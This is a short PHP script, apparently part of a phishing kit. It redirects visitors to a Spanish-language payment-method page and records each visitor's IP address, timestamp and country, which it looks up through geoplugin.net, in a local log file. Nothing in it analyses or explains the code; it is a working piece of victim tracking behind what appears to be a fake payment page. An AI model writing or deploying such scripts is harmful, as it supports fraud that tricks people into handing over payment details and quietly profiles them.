<?php
header("Location: Seleccione_medio_de_pago.php");
?>
<?php 
date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ;
$ip = getenv("REMOTE_ADDR");
$file = fopen("visit.txt","a");fwrite($file,$ip." - ".$TIME." - " . $COUNTRY ."\n") ;
?>
